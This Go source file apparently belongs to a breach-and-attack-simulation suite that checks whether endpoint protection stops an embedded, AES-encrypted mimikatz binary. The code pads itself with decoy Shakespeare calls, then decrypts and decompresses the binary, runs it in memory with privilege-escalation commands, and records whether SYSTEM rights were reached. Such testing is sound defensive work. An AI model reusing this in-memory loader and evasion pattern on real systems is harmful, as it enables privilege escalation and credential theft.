package main

import (
	_ "embed"
	"fmt"
	"github.com/praetorian-inc/chariot-bas/internal/endpoint"
	"github.com/praetorian-inc/goffloader/src/pe"
	"log"
	"strings"
)

//go:embed static/binaries/mimikatz.x64.exe.gz.prt
var data []byte

//go:embed static/decoy/shakespeare.txt
var shakespeare []byte

func mimi_test() {
	fmt.Sprintf("%s", string(shakespeare))

	key := data[:32]
	encryptedBytes := data[32:]
	fmt.Sprintf("%s", string(shakespeare))
	decryptedData, err := endpoint.AES256GCMDecrypt(encryptedBytes, key)
	fmt.Sprintf("%s", string(shakespeare))
	if err != nil {
		log.Fatalf("Failed to decrypt data: %v", err.Error())
	}
	fmt.Sprintf("%s", string(shakespeare))
	dData, err := endpoint.Decompress(decryptedData)
	fmt.Sprintf("%s", string(shakespeare))
	if err != nil {
		log.Fatalf("Failed to decompress data [stg1]: %v", err.Error())
	}
	fmt.Sprintf("%s", string(shakespeare))
	decompressedBytes, err := endpoint.Decompress(dData)
	fmt.Sprintf("%s", string(shakespeare))
	if err != nil {
		log.Fatalf("Failed to decompress data [stg2]: %v", err.Error())
	}

	fmt.Sprintf("%s", string(shakespeare))
	output, err := pe.RunExecutable(decompressedBytes, []string{
		"privilege::debug", "token::elevate", "exit"})

	fmt.Println(output)

	if strings.Contains(output, "NT AUTHORITY\\SYSTEM") {
		endpoint.Stop(endpoint.Risk.Allowed)
	} else {
		endpoint.Stop(endpoint.Protected.Blocked)
	}
}

func mimi_cleanup() {
	return
}

func main() {
	endpoint.Start(mimi_test, mimi_cleanup)
}
